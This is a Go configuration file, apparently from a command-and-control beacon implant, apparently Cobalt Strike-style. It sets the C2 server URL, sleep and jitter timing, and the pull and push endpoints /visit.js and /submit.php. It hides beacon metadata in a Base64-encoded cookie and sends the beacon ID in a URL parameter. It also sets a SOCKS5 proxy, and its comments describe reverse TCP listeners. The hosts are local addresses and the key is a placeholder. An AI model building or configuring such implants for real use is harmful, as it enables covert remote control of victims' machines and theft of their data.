package core

// HTTP(S) --> http(s)://example.com:8080
// TCP Bind --> tcp://127.0.0.1:5555, tcp://0.0.0.0:5555
// TCP Reverse --> tcp://192.168.1.100:8888

// Store --> URL, URL:?, Header:?
// Coding --> Mask, Base64, Base64url, Netbios, Netbiosu

var (
	Sleep    = 60000
	Jitter   = 10
	C2_URL   = "http://127.0.0.1:80"
	PullInfo = map[string]interface{}{
		"URL":    C2_URL + "/visit.js",
		"Header": "VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo2OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY5LjA=",
		"Output": map[string]string{
			"Coding":  "None",
			"Append":  "",
			"Prepend": "",
		},
		"MetaData": map[string]string{
			"Store":   "Header:Cookie",
			"Coding":  "Base64",
			"Append":  "",
			"Prepend": "",
		},
	}
	PushInfo = map[string]interface{}{
		"URL":    C2_URL + "/submit.php",
		"Header": "VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo2OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY5LjA=",
		"Output": map[string]string{
			"Coding":  "None",
			"Append":  "",
			"Prepend": "",
		},
		"BeaconID": map[string]string{
			"Store":   "URL:id",
			"Coding":  "None",
			"Append":  "",
			"Prepend": "",
		},
	}
	ProxyURL   = "socks5://admin:123456@127.0.0.1:1080"
	Public_Key = "-----BEGIN PUBLIC KEY-----\nXXXYYYZZZ\n-----END PUBLIC KEY-----"
)
